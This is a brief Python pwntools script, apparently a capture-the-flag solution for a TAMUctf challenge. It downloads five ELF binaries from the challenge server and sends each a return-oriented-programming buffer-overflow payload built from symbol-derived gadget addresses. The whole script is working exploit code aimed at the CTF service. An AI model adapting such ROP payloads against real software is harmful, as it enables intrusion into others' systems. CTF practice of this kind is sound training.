from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="quick-mafs")

for binary in range(5):
	instructions = p.recvline() # the server will give you instructions as to what your exploit should do
	print(instructions)
	with open("elf0", "wb") as file:
		file.write(bytes.fromhex(p.recvline().rstrip().decode()))
	e = ELF('./elf0')
	print_addr = e.symbols['print'] + 0xc
	pop_rdx = e.symbols['gadgets'] + 0x22c
	n = int(instructions[:-1].split()[-1], 16)
	print(hex(n))

	payload = b'A'*8
	payload += p64(pop_rdx)
	payload += p64(2)
	payload += p64(print_addr)
	payload += p64(n)

	p.sendline(payload.hex())
p.interactive()
